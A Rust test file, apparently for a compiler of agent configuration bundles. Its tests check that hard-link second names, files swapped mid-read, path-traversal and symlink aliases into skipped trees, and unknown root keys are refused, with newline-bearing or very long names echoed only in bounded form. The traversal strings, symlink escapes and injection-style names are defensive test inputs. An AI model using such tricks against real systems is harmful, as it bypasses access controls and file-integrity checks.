    let leaf = library.recipe("derived", &derived(json!({})), None);
    std::fs::hard_link(base.join("roles/role.md"), base.join("roles/review.md")).unwrap();
    let refused = "bundle files 'roles/review.md' and 'roles/role.md' are two names for one file \
                   a bound read consumed: a layer's identity names a consumed file by exactly \
                   one entry, and a second name for it inside the layer, consumed or not, is \
                   refused rather than bound twice (decision 0065 slice one, design D7)";
    assert_eq!(
        (said(&base), said(&leaf)),
        (
            format!("bundle: {refused}"),
            format!("bundle: bundle: {refused} (composed: derived -> base)")
        )
    );
}

/// Rebuild unit 16-fix-c, F1 (16.1; design D7): a consumed file has one
/// name in its layer, the one it was read by. A second name the walk meets
/// is refused naming both, standalone and inherited, rather than walked as a
/// file nothing consumed.
#[cfg(unix)]
#[test]
fn a_consumed_file_has_one_name_in_its_layer() {
    // The walk: a hard link to the table, in the layer and in a directory.
    for other in ["h.json", "copies/p.json"] {
        let library = Library::new();
        let (base, leaf) = active_inputs(&library, "roles/role.md", "policy.json");
        std::fs::create_dir_all(base.join("copies")).unwrap();
        std::fs::hard_link(base.join("policy.json"), base.join(other)).unwrap();
        let refused = another_name(other, "policy.json");
        assert_eq!(said(&base), format!("bundle: {refused}"), "{other}");
        assert_eq!(
            said(&leaf),
            format!("bundle: bundle: {refused} (composed: derived -> base)"),
            "{other}, inherited"
        );
    }
}

/// Rebuild unit 16-fix-d (16.1; design D7): the name read by is looked up
/// exactly, never searched for. Where it is gone when the read is observed
/// again, the read is refused as replaced, however many other entries hold
/// the file: on `95d4ff19` two of them were refused as two other names.
#[cfg(unix)]
#[test]
fn a_name_gone_at_its_second_observation_is_not_searched_for() {
    let library = Library::new();
    let (base, _) = active_inputs(&library, "roles/role.md", "policy.json");
    let policy = base.join("policy.json");
    let hide: Box<dyn FnOnce()> = {
        let (policy, aside) = (policy.clone(), library.path().join("aside"));
        let second = base.join("h2.json");
        Box::new(move || {
            std::fs::hard_link(&policy, second).unwrap();
            hide_behind(&policy, &policy.with_file_name("h1.json"), &aside);
        })
    };
    assert_eq!(
        said_acting(&base, vec![(ReadStage::Entered, policy.clone(), hide)]),
        format!("bundle: {}", policy_escape(&base, "policy.json", REPLACED))
    );
}

/// Rebuild unit 16-fix-d (16.1; design D7): an entry moved away once its
/// handle is open, and back again before the read is observed again, is the
/// same file under the same name, which compiles to exactly the identity an
/// undisturbed compile seals: nothing looks at the path between the lookup
/// and the second observation. On `95d4ff19` a listing did, and refused it
/// as replaced.
#[cfg(unix)]
#[test]
fn an_entry_moved_away_and_back_is_the_name_it_was_read_by() {
    let library = Library::new();
    let (base, _) = active_inputs(&library, "roles/role.md", "policy.json");
    let stable = said(&base);
    assert!(stable.starts_with("compiled to"), "{stable}");
    let policy = base.join("policy.json");
    let aside = library.path().join("aside");
    let away: Box<dyn FnOnce()> = {
        let (policy, aside) = (policy.clone(), aside.clone());
        Box::new(move || std::fs::rename(&policy, &aside).unwrap())
    };
    let back: Box<dyn FnOnce()> = {
        let policy = policy.clone();
        Box::new(move || std::fs::rename(&aside, &policy).unwrap())
    };
    let acts: Vec<Act> = vec![
        (ReadStage::Entered, policy.clone(), away),
        (ReadStage::Read, policy, back),
    ];
    assert_eq!(said_acting(&base, acts), stable);
}

/// A base whose `work` seat reads `roles/role.md` and whose `review` seat
/// reads `review`, beside `also -> roles`, a contained linked directory,
/// and a leaf over it.
#[cfg(unix)]
fn linked_directory(library: &Library, review: &str) -> (PathBuf, PathBuf) {
    let mut bundle = base_bundle();
    bundle["seats"]["review"]["role"] = json!(review);
    let base = library.recipe("base", &bundle, Some(&base_policy()));
    std::os::unix::fs::symlink("roles", base.join("also")).unwrap();
    let leaf = library.recipe("derived", &derived(json!({})), None);
    (base, leaf)
}

/// Rebuild unit 16-fix-d, return F1 (16.1, 16.3; design D7): a path through
/// a contained linked directory lists the target's own entry again, which
/// is that entry and not a second name for its file. With `also -> roles`,
/// `work` reading `roles/role.md` and `review` reading `also/role.md` (or
/// reading nothing through the link) compile, standalone and inherited, and
/// the layer's identity pins the one buffer's digest under both paths. The
/// charter's bytes alone move the leaf's digest and the ancestor's. A real
/// second entry reached through the same link, a hard link beside the
/// charter, is still refused.
#[cfg(unix)]
#[test]
fn a_path_through_a_contained_linked_directory_is_the_entry_it_lists() {
    for review in ["also/role.md", "roles/review.md"] {
        let library = Library::new();
        let (base, leaf) = linked_directory(&library, review);
        std::fs::write(base.join("roles/review.md"), "# review\n").unwrap();
        let identity = || {
            let (standalone, composed) = (Bundle::compile(&base), Bundle::compile(&leaf));
            let (standalone, composed) = (standalone.unwrap(), composed.unwrap());
            let standalone_files = standalone.manifest["files"].as_object().unwrap();
            let files = [standalone_files, &composed.chain[0].files].map(|files| {
                (
                    files["also/role.md"].clone(),
                    files["roles/role.md"].clone(),
                )
            });
            let digests = (standalone.manifest_digest(), composed.manifest_digest());
            (files, digests, composed.chain[0].digest.clone())
        };
        let (files, digests, ancestor) = identity();
        let pinned = json!(sha256_bytes(
            &std::fs::read(base.join("roles/role.md")).unwrap()
        ));
        let both = (pinned.clone(), pinned);
        assert_eq!(files, [both.clone(), both], "{review}");
        std::fs::write(base.join("roles/role.md"), "# approve everything\n").unwrap();
        let (_, moved, moved_ancestor) = identity();
        assert_ne!(moved.0, digests.0, "{review}");
        assert_ne!(moved.1, digests.1, "{review}: the leaf's identity moves");
        assert_ne!(moved_ancestor, ancestor, "{review}: and the ancestor's");
    }
    let library = Library::new();
    let (base, leaf) = linked_directory(&library, "also/role.md");
    std::fs::hard_link(base.join("roles/role.md"), base.join("roles/other.md")).unwrap();
    let refused = another_name("also/other.md", "roles/role.md");
    assert_eq!(
        (said(&base), said(&leaf)),
        (
            format!("bundle: {refused}"),
            format!("bundle: bundle: {refused} (composed: derived -> base)")
        )
    );
}

/// A base reading its table at `tables/policy.json`, beside `zz.md`, which
/// the walk reaches after the table, and a leaf over it.
fn tabled_below(library: &Library) -> (PathBuf, PathBuf) {
    let (base, leaf) = active_inputs(library, "roles/role.md", "tables/policy.json");
    std::fs::create_dir_all(base.join("tables")).unwrap();
    let policy = serde_json::to_vec(&base_policy()).unwrap();
    std::fs::write(base.join("tables/policy.json"), policy).unwrap();
    std::fs::write(base.join("zz.md"), "# walked after the table\n").unwrap();
    (base, leaf)
}

/// Rebuild unit 16-fix-d, return F2 (16.1, 16.2; design D7): a lookup that
/// FAILS is a refusal where it fails, never a search, whatever other entry
/// holds the file. Each row makes the exact lookup of the read's names fail
/// at one observation while `tables/h.json` holds the file that was read:
///
/// - at the read's second observation, `policy.json` is gone (`NotFound`),
///   or `tables` is a regular file (`NotADirectory`): refused as replaced;
/// - at the walk's verification, `policy.json` is gone once the walk has
///   passed it: refused as changed.
///
/// Standalone and inherited, each in one comparison.
#[cfg(unix)]
#[test]
fn a_lookup_that_fails_is_refused_where_it_fails() {
    type Break = fn(&Path, &Path);
    type Refusal = fn(&Path, bool) -> String;
    let gone: Break = |base, aside| {
        let tables = base.join("tables");
        hide_behind(&tables.join("policy.json"), &tables.join("h.json"), aside);
    };
    let not_a_directory: Break = |base, aside| {
        let tables = base.join("tables");
        std::fs::hard_link(tables.join("policy.json"), tables.join("h.json")).unwrap();
        std::fs::rename(&tables, aside).unwrap();
        std::fs::write(&tables, "# not a directory\n").unwrap();
    };
    // What a compile of `base` says, and of a leaf over it (`true`): a table
    // read is refused as it is merged, before any composition is named;
    // the walk's verification is the ancestor's seal.
    let replaced = |base: &Path, _: bool| {
        let refused = policy_escape(base, "tables/policy.json", REPLACED);
        format!("bundle: {refused}")
    };
    let changed = |base: &Path, inherited: bool| {
        let refused = table_changed(base, "tables/policy.json");
        match inherited {
            false => format!("bundle: {refused}"),
            true => format!("bundle: bundle: {refused} (composed: derived -> base)"),
        }
    };
    let rows: [(&str, Break, ReadStage, &str, Refusal); 3] = [
        (
            "second observation, gone",
            gone,
            ReadStage::Read,
            "",
            replaced,
        ),
        (
            "second observation, not a directory",
            not_a_directory,
            ReadStage::Read,
            "",
            replaced,
        ),
        (
            "walk's verification, gone",
            gone,
            ReadStage::Walked,
            "zz.md",
            changed,
        ),
    ];
    let (mut observed, mut expected) = (Vec::new(), Vec::new());
    for (row, broken, stage, at, refused) in rows {
        let said_in = |inherited: bool| {
            let library = Library::new();
            let (base, leaf) = tabled_below(&library);
            let watched = match at {
                "" => base.join("tables/policy.json"),
                at => base.join(at),
            };
            let (layer, aside) = (base.clone(), library.path().join("aside"));
            let act = move || broken(&layer, &aside);
            let compiled = if inherited { &leaf } else { &base };
            let said = said_replacing(compiled, &watched, stage, act);
            (said, refused(&base, inherited))
        };
        let ((standalone, first), (inherited, second)) = (said_in(false), said_in(true));
        observed.push((row, standalone, inherited));
        expected.push((row, first, second));
    }
    assert_eq!(observed, expected);
}

/// Finding H4, the aliases: neither a spelling nor a link hides the target.
/// A reference that normalises into the skipped tree is refused as written;
/// an allowed path whose CANONICAL target stands there is refused too; and
/// a path written under the skipped tree is refused even where a link
/// points back out of it, because the link itself is bytes nobody pins.
#[cfg(unix)]
#[test]
fn no_spelling_and_no_link_hides_an_active_input_under_a_skipped_tree() {
    use std::os::unix::fs::symlink;
    let library = Library::new();
    let (base, _) = active_inputs(&library, "roles/role.md", "policy.json");
    std::fs::write(base.join("capabilities/reviewer.md"), "# hidden\n").unwrap();
    std::fs::write(
        base.join("capabilities/policy.json"),
        serde_json::to_vec(&base_policy()).unwrap(),
    )
    .unwrap();
    symlink("../capabilities/reviewer.md", base.join("roles/alias.md")).unwrap();
    symlink("../capabilities", base.join("roles/linked")).unwrap();
    symlink("../roles/role.md", base.join("capabilities/out.md")).unwrap();
    symlink("capabilities/policy.json", base.join("table.json")).unwrap();
    let absolute = base.join("capabilities/reviewer.md");
    for (role, top) in [
        ("./capabilities/reviewer.md", "capabilities"),
        ("roles/../capabilities/reviewer.md", "capabilities"),
        (absolute.to_str().unwrap(), "capabilities"),
        ("roles/alias.md", "capabilities"),
        ("roles/linked/reviewer.md", "capabilities"),
        ("capabilities/out.md", "capabilities"),
        ("dialects/../capabilities/reviewer.md", "capabilities"),
    ] {
        let mut bundle = base_bundle();
        bundle["seats"]["work"]["role"] = json!(role);
        let dir = library.recipe("base", &bundle, Some(&base_policy()));
        assert_eq!(
            said(&dir),
            format!("bundle: {}", role_refusal(&base, role, top)),
            "{role}"
        );
    }
    for policy in ["./capabilities/policy.json", "table.json"] {
        let mut bundle = base_bundle();
        bundle["policy"] = json!(policy);
        let dir = library.recipe("base", &bundle, Some(&base_policy()));
        assert_eq!(
            said(&dir),
            format!("bundle: {}", policy_refusal(&base, policy, "capabilities")),
            "{policy}"
        );
    }
    // The other two names the walk skips are no different.
    std::fs::create_dir_all(base.join("dialects")).unwrap();
    std::fs::write(base.join("dialects/charter.md"), "# hidden\n").unwrap();
    let mut bundle = base_bundle();
    bundle["seats"]["work"]["role"] = json!("dialects/charter.md");
    let dir = library.recipe("base", &bundle, Some(&base_policy()));
    assert_eq!(
        said(&dir),
        format!(
            "bundle: {}",
            role_refusal(&base, "dialects/charter.md", "dialects")
        )
    );
}

/// Rebuild unit 5e-fix-b (the chief's R1 and R3 on 5e-fix): a layer's root
/// is a closed vocabulary. 5e-fix refused six capability words by name, and
/// its council then compiled `confine`, `allow`, `mcp` and `network` at a
/// root, where they confined nothing. Every key outside the vocabulary is
/// now refused at the root of every layer, a standalone bundle, an
/// inherited base and a derived leaf alike, naming the layer and the key
/// boundedly and never the value. The same layers without the key compile,
/// and hands written on a seat compile and record exactly those hands and
/// the realm's boundary.
#[test]
#[expect(
    clippy::too_many_lines,
    reason = "baseline 2026-09-29, decision 0065 slice one merged with main; split after #319"
)]
fn a_bundle_root_is_a_closed_vocabulary_at_every_layer() {
    let library = Library::new();
    let refusal = |recipe: &str, key: &str| {
        format!(
            "bundle: recipe {recipe} declares {key} at the bundle root, which admits only \
             name, description, cost, policy, protected_phase, egress_minimum, seats, extends, \
             override and remove. A capability or confinement is written on each seat it \
             governs (a sandbox as 'tools.sandbox'), and a boundary is the realm's, declared in \
             realms.json. A key the compiler does not read would compile, deliver nothing and \
             leave every seat at its harness default, so it is refused rather than ignored \
             (decision 0004; decision 0065 slice one, rebuild unit 5e-fix-b)"
        )
    };
    let hands = json!({"kind": "workspace", "network": false, "binds": []});
    let long = "k".repeat(100_000);
    let rows = [
        (
            "tools",
            json!({"allow": ["Read"], "sandbox": "workspace-write"}),
        ),
        ("sandbox", json!("read-only")),
        ("hands", hands.clone()),
        ("capabilities", json!({"web": "requires"})),
        ("driver", json!({"command": ["./drive", "plain"]})),
        ("boundary", json!("open")),
        ("confine", json!({"network": false})),
        ("allow", json!(["Read", "Grep"])),
        ("mcp", json!({"servers": {}})),
        ("network", json!(false)),
        ("frobnicate", json!(1)),
        (long.as_str(), json!(1)),
        ("evil\nkey", json!(1)),
    ];
    let named = |key: &str| match key {
        "evil\nkey" => "'evil…' (8 bytes, not echoed in full)".to_string(),
        key if key.len() == 100_000 => {
            format!("'{}…' (100000 bytes, not echoed in full)", "k".repeat(32))
        }
        key => format!("'{key}'"),
    };

    // The controls: the same layers, carrying no such key, compile.
    let base = library.recipe("base", &base_bundle(), Some(&base_policy()));
    let leaf = library.recipe("derived", &derived(json!({})), None);
    let standalone = said(&base);
    let inherited = said(&leaf);
    let files = |dir: &Path| -> Vec<String> {
        let compiled = Bundle::compile(dir).unwrap();
        compiled.manifest["files"]
            .as_object()
            .unwrap()
            .keys()
            .cloned()
            .collect()
    };
    assert_eq!(
        files(&base),
        ["bundle.json", "policy.json", "roles/role.md"]
    );
    assert_eq!(
        files(&leaf),
        ["@compose/0000/base", "bundle.json", "roles/role.md"]
    );

    for (key, value) in &rows {
        let mut bundle = base_bundle();
        bundle[*key] = value.clone();
        library.recipe("base", &bundle, Some(&base_policy()));
        let expected = refusal("'base'", &named(key));
        assert_eq!(said(&base), expected, "standalone {key}");
        assert_eq!(said(&leaf), expected, "inherited {key}");
        library.recipe("base", &base_bundle(), Some(&base_policy()));
        library.recipe("derived", &derived(json!({ *key: value })), None);
        assert_eq!(
            said(&leaf),
            refusal("'derived'", &named(key)),
            "derived {key}"
        );
        library.recipe("derived", &derived(json!({})), None);
        assert_eq!(
            (said(&base), said(&leaf)),
            (standalone.clone(), inherited.clone()),
            "control {key}"
        );
    }

    let mut bundle = base_bundle();
    bundle["name"] = json!("x".repeat(100_000));
    bundle["confine"] = json!({"network": false});
    let long_named = library.recipe("long", &bundle, Some(&base_policy()));
    let recipe = format!("'{}…' (100000 bytes, not echoed in full)", "x".repeat(32));
    assert_eq!(said(&long_named), refusal(&recipe, "'confine'"));
    // Its control: the same bundle without `confine` compiles under that name.
    bundle.as_object_mut().unwrap().remove("confine");
    library.recipe("long", &bundle, Some(&base_policy()));
    let compiled = Bundle::compile(&long_named).unwrap();
    assert_eq!(compiled.name, "x".repeat(100_000));
    assert_eq!(
        files(&long_named),
        ["bundle.json", "policy.json", "roles/role.md"]
    );

    // A seat's own hands are the seat's: they compile and are recorded.
    let mut bundle = base_bundle();
    bundle["seats"]["work"]["hands"] = hands.clone();
    library.recipe("base", &bundle, Some(&base_policy()));
    let compiled = Bundle::compile(&base).unwrap();
    assert_eq!(compiled.manifest["hands"], json!({"work": hands}));
    assert_eq!(compiled.manifest["boundary"], json!({"work": "namespace"}));
}

/// Rebuild unit 5e-fix-b (the chief's R2 on 5e-fix): a refusal on a
/// composed bundle ends with the chain, leaf first, and every name in it
/// is the one its layer declares, which nothing bounds. A 100,000-byte or
/// newline-bearing leaf or ancestor name is rendered bounded in the
/// complete diagnostic, and a plain name reads as it always has. Each
/// row's control, the same chain without the misplaced key, compiles
/// under exactly those names.
#[test]
fn a_composed_refusal_names_long_or_unsafe_layers_boundedly() {
    let library = Library::new();
    let bounded = |fill: &str| format!("'{}…' (100000 bytes, not echoed in full)", fill.repeat(32));
    let unsafe_name = "'evil…' (9 bytes, not echoed in full)";
    let rows = [
        (
            "x".repeat(100_000),
            "base".to_string(),
            bounded("x"),
            "base".to_string(),
        ),
        (
            "derived".to_string(),
            "y".repeat(100_000),
            "derived".to_string(),
            bounded("y"),
        ),
        (
            "evil\nleaf".to_string(),
            "base".to_string(),
            unsafe_name.to_string(),
            "base".to_string(),
        ),
        (
            "derived".to_string(),
            "evil\nbase".to_string(),
            "derived".to_string(),
            unsafe_name.to_string(),
        ),
    ];
    let misplaced = super::agent_tests::misplaced_in_driver(
        "work",
        "'sandbox'",
        " 'sandbox' is a typed tool field, written as 'tools.sandbox' on the seat.",
    );
    for (leaf_name, base_name, leaf_shown, base_shown) in rows {
        let mut base = base_bundle();
        base["name"] = json!(base_name);
        base["seats"]["work"]["driver"]["sandbox"] = json!("read-only");
        library.recipe("base", &base, Some(&base_policy()));
        let mut leaf = derived(json!({}));
        leaf["name"] = json!(leaf_name);
        let dir = library.recipe("derived", &leaf, None);
        assert_eq!(
            error(Bundle::compile(&dir)),
            format!("bundle: {misplaced} (composed: {leaf_shown} -> {base_shown})"),
            "{leaf_shown} -> {base_shown}"
        );
        base["seats"]["work"]["driver"] = json!({"command": ["./drive", "plain"]});
        library.recipe("base", &base, Some(&base_policy()));
        let compiled = Bundle::compile(&dir).unwrap();
        let chain: Vec<&str> = compiled.chain.iter().map(|a| a.name.as_str()).collect();
        assert_eq!(
            (compiled.name.as_str(), chain),
            (leaf_name.as_str(), vec![base_name.as_str()])
        );
    }
}
